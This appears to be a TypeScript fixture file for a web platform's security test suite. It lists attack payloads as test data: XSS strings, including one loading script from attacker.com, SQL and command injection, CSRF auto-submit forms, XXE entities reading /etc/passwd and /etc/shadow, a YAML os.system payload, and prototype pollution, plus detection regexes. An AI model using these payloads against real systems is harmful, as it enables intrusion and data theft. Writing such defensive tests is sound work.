/**
 * Security Test Data & Fixtures
 *
 * Comprehensive collection of test data for security testing suite
 * Organized by security concern category
 */

// ============================================================================
// XSS Attack Vectors
// ============================================================================

export const xssVectors = {
  scriptTags: [
    '<script>alert("xss")</script>',
    '<script src="http://attacker.com/malicious.js"></script>',
    '"><script>alert(String.fromCharCode(88, 83, 83))</script>',
  ],
  eventHandlers: [
    '<img src=x onerror="alert(\'xss\')">',
    '<body onload="alert(\'xss\')">',
    '<svg onload="alert(\'xss\')">',
    '<marquee onstart="alert(\'xss\')">',
    '<input onfocus="alert(\'xss\')" autofocus>',
    'javascript:alert("xss")',
    '<iframe src="javascript:alert(\'xss\')"></iframe>',
  ],
  dataUrls: [
    'data:text/html,<script>alert("xss")</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
  ],
  cssInjection: [
    'background: url(javascript:alert(1))',
    'background-image: url("javascript:alert(\'xss\')")',
    'behavior: url(xss.htc)',
  ],
  htmlEntities: [
    '&lt;img src=x onerror="alert(\'xss\')"&gt;',
    '&lt;script&gt;alert("xss")&lt;/script&gt;',
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    'test/../../sensitive_data.json',
  ],
  svgVectors: [
    '<svg/onload="alert(\'xss\')">',
    '<svg><script>alert("xss")</script></svg>',
    '<svg><animate onbegin="alert(\'xss\')" attributeName="opacity" dur="1s" />',
  ],
};

// ============================================================================
// SQL Injection Vectors
// ============================================================================

export const sqlInjectionVectors = {
  basicInjection: [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE extensions;--",
    "' UNION SELECT NULL, NULL, NULL--",
  ],
  advancedInjection: [
    "' OR 'a'='a",
    "1' UNION ALL SELECT NULL, username, password FROM users--",
    "admin' --",
    "' OR 1=1 /*",
  ],
  timeBasedBlind: [
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5)--",
  ],
  commandInjection: [
    "; cat /etc/passwd",
    "| whoami",
    "$(whoami)",
    "`whoami`",
  ],
};

// ============================================================================
// CSRF Attack Scenarios
// ============================================================================

export const csrfScenarios = {
  maliciousForm: {
    html: `<html>
  <body onload="document.forms[0].submit()">
    <form action="https://target-site.com/api/delete-extension" method="POST">
      <input type="hidden" name="extensionId" value="critical-ext">
      <input type="hidden" name="action" value="delete">
    </form>
  </body>
</html>`,
  },
  imageBased: {
    img: '<img src="https://target-site.com/api/delete-extension?id=critical-ext">',
  },
  scriptBased: {
    script: `<script>
  fetch('https://target-site.com/api/delete-extension', {
    method: 'DELETE',
    body: JSON.stringify({ id: 'critical-ext' })
  });
</script>`,
  },
};

// ============================================================================
// Hardcoded Secrets & Sensitive Data
// ============================================================================

export const hardcodedSecrets = {
  apiKeys: [
    'test_api_key_1234567890abcdefghijklmnop',
    'example_google_key_1234567890abcdefghijklmnopqrstuv',
    'test_github_pat_11ABCDEFGHIJKLMNOPQRSTUVWXYZ',
  ],
  passwords: [
    'test_password_123',
    'test_password_example',
    'test_root_password',
    'test_db_password',
  ],
  tokens: [
    'test_token_1234567890abcdefghijklmnopqrstuvwxyz',
    'example_token_16c7e42f292c6912191c87d058461b6b1b9c',
  ],
  connectionStrings: [
    'mongodb://admin:password123@cluster.mongodb.net/db',
    'Server=dbserver;User Id=sa;Password=secret123;',
    'postgresql://user:password@localhost/database',
  ],
};

// ============================================================================
// Permission Escalation Attempts
// ============================================================================

export const privileEscalationAttempts = {
  roleClaiming: [
    { claimed: 'admin', actual: 'user' },
    { claimed: 'super-admin', actual: 'read:dashboard' },
    { claimed: 'system-admin', actual: 'guest' },
  ],
  permissionBypass: [
    { original: 'read:dashboard', modified: 'write:dashboard' },
    { original: 'user', modified: 'admin' },
    { original: ['read'], modified: ['read', 'write', 'delete', 'admin'] },
  ],
  tokenTampering: [
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c', // Valid structure
    'eyJhbGciOiJub25lIiwgInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.', // No signature
  ],
};

// ============================================================================
// Input Validation Test Cases
// ============================================================================

export const inputValidationCases = {
  validInputs: {
    extensionId: [
      'my-extension',
      'extension123',
      'ext-v2-0-1',
      'test-ext-abc-123',
    ],
    componentName: [
      'Dashboard Widget',
      'User Form',
      'Settings Panel',
      'Data Table',
    ],
    navigationLabel: [
      'Dashboard',
      'Admin Settings',
      'User Management',
      'System Log',
    ],
  },
  invalidInputs: {
    extensionId: [
      'extension<script>',
      'ext";DROP TABLE;--',
      'ext\'; DROP TABLE;--',
      'ext\x00null',
      '../../../etc/passwd',
    ],
    componentName: [
      '<img src=x onerror="alert(1)">',
      '<script>alert("xss")</script>',
      'Component${process.env.SECRET}',
    ],
    navigationLabel: [
      '<svg onload="alert(1)">',
      'Label<iframe src="javascript:alert(1)">',
      '"><script>alert(1)</script>',
    ],
  },
  edgeCases: {
    empty: ['', '   ', '\t', '\n'],
    maxLength: ['A'.repeat(1000), 'B'.repeat(10000)],
    specialCharacters: [
      '!@#$%^&*()',
      '´`¡¿Ñ',
      '中文字符',
      'العربية',
      '🔒🔐🔑',
    ],
    nullBytes: ['string\x00injection', 'null\0byte', 'test\0test'],
    unicode: [
      'test\u0000test',
      '\uFEFF<script>',
      '\u202E\u202D<script>',
    ],
  },
};

// ============================================================================
// Deserialization Attack Vectors
// ============================================================================

export const deserializationVectors = {
  prototypePollution: [
    '{"__proto__":{"isAdmin":true}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
    '{"__proto__":{"admin":true,"password":"hacked"}}',
  ],
  xxeAttacks: [
    `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`,
    `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<foo>&xxe;</foo>`,
  ],
  yamlInjection: [
    `!!python/object/apply:os.system
args: ['cat /etc/passwd']`,
  ],
};

// ============================================================================
// Secure Configuration Examples
// ============================================================================

export const secureConfigurations = {
  environmentVariables: {
    valid: {
      API_KEY: '${API_KEY}',
      DATABASE_URL: '${DATABASE_URL}',
      JWT_SECRET: '${JWT_SECRET}',
      ENCRYPTION_KEY: '${ENCRYPTION_KEY}',
    },
    invalid: {
      API_KEY: 'sk_live_hardcoded_key_12345',
      DATABASE_URL: 'mongodb://admin:password@localhost/db',
      JWT_SECRET: 'my-super-secret-key',
    },
  },
  secureHeaders: {
    contentSecurityPolicy: "default-src 'self'; script-src 'self' 'unsafe-inline'",
    xContentTypeOptions: 'nosniff',
    xFrameOptions: 'DENY',
    xXSSProtection: '1; mode=block',
    strictTransportSecurity: 'max-age=31536000; includeSubDomains',
    referrerPolicy: 'strict-origin-when-cross-origin',
  },
  cookieSettings: {
    secure: true,
    httpOnly: true,
    sameSite: 'Strict',
    maxAge: 3600000, // 1 hour
  },
};

// ============================================================================
// Rate Limiting Scenarios
// ============================================================================

export const rateLimitingScenarios = {
  normalUsage: {
    requests: 5,
    timeWindow: 60000, // 1 minute
    limit: 10,
    shouldBlock: false,
  },
  heavyUsage: {
    requests: 15,
    timeWindow: 60000,
    limit: 10,
    shouldBlock: true,
  },
  bruteForceAttempt: {
    requests: 100,
    timeWindow: 60000,
    limit: 10,
    shouldBlock: true,
  },
};

// ============================================================================
// Permission Validation Test Cases
// ============================================================================

export const permissionValidationCases = {
  validPermissions: [
    'read:dashboard',
    'write:content',
    'admin:system',
    'execute:operations',
    'delete:extensions',
  ],
  invalidPermissions: [
    'invalid permission with spaces',
    'permission;DROP TABLE;--',
    '<script>permission</script>',
    'permission\x00injection',
    '',
    null,
    undefined,
    'permission/../../../sensitive',
  ],
};

// ============================================================================
// Authentication Test Cases
// ============================================================================

export const authenticationCases = {
  validTokens: [
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
    'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
  ],
  invalidTokens: [
    '',
    'invalid-token',
    'not-a-jwt-token',
    'eyJhbGciOiJub25lIiwgInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.', // No signature
  ],
  expiredTokens: [
    {
      token: 'valid.jwt.token',
      expiresAt: new Date(Date.now() - 3600000), // Expired 1 hour ago
    },
  ],
};

// ============================================================================
// Resource Limit Test Cases
// ============================================================================

export const resourceLimitCases = {
  normalLoad: {
    extensions: 50,
    limit: 1000,
    shouldAllow: true,
  },
  nearLimit: {
    extensions: 950,
    limit: 1000,
    shouldAllow: true,
  },
  atLimit: {
    extensions: 1000,
    limit: 1000,
    shouldAllow: false,
  },
  overLimit: {
    extensions: 1500,
    limit: 1000,
    shouldAllow: false,
  },
};

// ============================================================================
// Audit Logging Test Cases
// ============================================================================

export const auditLoggingCases = {
  sensitiveOperations: [
    { event: 'extension_registered', sensitive: true },
    { event: 'component_override_applied', sensitive: true },
    { event: 'permission_denied', sensitive: true },
    { event: 'admin_action_performed', sensitive: true },
  ],
  suspiciousActivities: [
    { event: 'failed_login', threshold: 3 },
    { event: 'failed_permission_check', threshold: 5 },
    { event: 'invalid_request', threshold: 10 },
    { event: 'rate_limit_exceeded', threshold: 1 },
  ],
};

// ============================================================================
// Code Quality & Security Rules
// ============================================================================

export const codeSecurityRules = {
  shouldBeFlagged: [
    // Hardcoded secrets
    'const API_KEY = "sk_live_hardcoded";',
    'const password = "admin123";',
    'const token = "ghp_hardcoded_token";',

    // Dangerous functions
    'eval(userInput);',
    'innerHTML = userInput;',
    'new Function(userInput);',

    // Missing validations
    'db.query("SELECT * FROM users WHERE id = " + userId);',

    // Dangerous patterns
    'document.write(userInput);',
    'setTimeout(userInput, 1000);',
  ],
  shouldNotBeFlagged: [
    // Environment variables
    'const API_KEY = process.env.API_KEY;',
    'const password = process.env.DB_PASSWORD;',

    // Safe operations
    'element.textContent = userInput;',
    'fetch(url, { method: "POST", body: JSON.stringify(data) });',
    'const sanitized = DOMPurify.sanitize(userInput);',

    // Proper validations
    'db.query("SELECT * FROM users WHERE id = ?", [userId]);',
  ],
};

// ============================================================================
// Helper Functions for Test Data Validation
// ============================================================================

export const testDataHelpers = {
  /**
   * Verify that input contains XSS vectors
   */
  hasXSSVector(input: string): boolean {
    return /(<script|onerror|onload|javascript:|<iframe|<svg|<img)/i.test(input);
  },

  /**
   * Verify that input contains SQL injection patterns
   */
  hasSQLInjection(input: string): boolean {
    return /('|"|;|--|\/\*|\*\/|UNION|SELECT|DROP|INSERT|DELETE|UPDATE)/i.test(input);
  },

  /**
   * Verify that input is properly escaped
   */
  isProperlyEscaped(input: string): boolean {
    return !(/[<>'"&]/.test(input)) || /(&lt;|&gt;|&quot;|&#x27;|&amp;)/.test(input);
  },

  /**
   * Verify permission format is valid
   */
  isValidPermission(permission: string): boolean {
    return /^[\w:]+$/.test(permission) && permission.length > 0;
  },

  /**
   * Verify token is properly formatted
   */
  isValidToken(token: string): boolean {
    return token.split('.').length === 3; // JWT format
  },

  /**
   * Check if value contains path traversal patterns
   */
  hasPathTraversal(input: string): boolean {
    return /\.\.|\/\/|\\\\/.test(input);
  },
};
